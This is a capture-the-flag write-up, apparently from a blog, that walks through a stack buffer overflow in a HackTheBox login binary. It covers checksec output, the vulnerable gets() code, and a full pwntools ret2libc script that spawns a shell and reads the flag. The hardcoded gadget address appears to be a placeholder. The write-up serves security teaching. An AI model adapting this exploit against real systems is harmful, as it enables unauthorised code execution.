---
layout: writeup
title: "Binary Exploitation Challenge - StackOverflow"
competition: "HackTheBox Cyber Apocalypse 2024"
category: "Pwn"
date: 2024-09-15
excerpt: "Exploiting a classic buffer overflow vulnerability to gain remote code execution."
---

## Challenge Description

We're given a binary that appears to be a simple login system. The goal is to exploit it and read the flag from the server.

**Challenge files:**
- `chall` (ELF 64-bit executable)
- `libc.so.6` (provided libc version)

## Initial Analysis

First, let's check the binary protections:

```bash
$ checksec chall
[*] '/home/user/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key findings:
- **No stack canary**: Buffer overflow is possible
- **NX enabled**: We can't execute shellcode on the stack
- **No PIE**: Binary addresses are fixed

## Vulnerability Discovery

Running the binary locally:

```bash
$ ./chall
Welcome to the secure login system!
Username: admin
Password: password
Access denied!
```

Let's examine the vulnerable function in Ghidra:

```c
void login() {
    char username[32];
    char password[32];
    
    printf("Username: ");
    gets(username);  // Vulnerable!
    
    printf("Password: ");
    gets(password);  // Also vulnerable!
    
    if (strcmp(username, "admin") == 0 && strcmp(password, "secret") == 0) {
        printf("Access granted!\n");
        system("/bin/sh");
    }
}
```

The `gets()` function doesn't perform bounds checking, allowing us to overflow both buffers.

## Exploitation Strategy

Since we have the addresses of useful functions like `system()` and we can control the return address, we can perform a ret2libc attack:

1. Overflow the password buffer
2. Overwrite the return address with the address of `system()`
3. Set up the stack so that "/bin/sh" is passed as an argument

## Exploit Development

```python
from pwn import *

# Setup
elf = ELF('./chall')
p = remote('challenge.htb', 1337)

# Addresses
system_addr = elf.symbols['system']
binsh_addr = next(elf.search(b'/bin/sh\x00'))

# Build payload
payload = b'A' * 40  # Offset to return address
payload += p64(0x400123)  # pop rdi; ret gadget
payload += p64(binsh_addr)
payload += p64(system_addr)

# Send exploit
p.sendlineafter(b'Username: ', b'admin')
p.sendlineafter(b'Password: ', payload)

# Get shell
p.interactive()
```

## Flag

```bash
$ python exploit.py
[+] Opening connection to challenge.htb on port 1337
[*] Switching to interactive mode
$ cat flag.txt
HTB{st4ck_0v3rfl0w_1s_cl4ss1c_but_g0ld}
```

## Lessons Learned

- Always check for dangerous functions like `gets()`, `strcpy()`, `sprintf()`
- Modern protections like stack canaries and ASLR make exploitation harder but not impossible
- Understanding the calling convention (x64 uses RDI for first argument) is crucial
- ret2libc is a powerful technique when NX is enabled
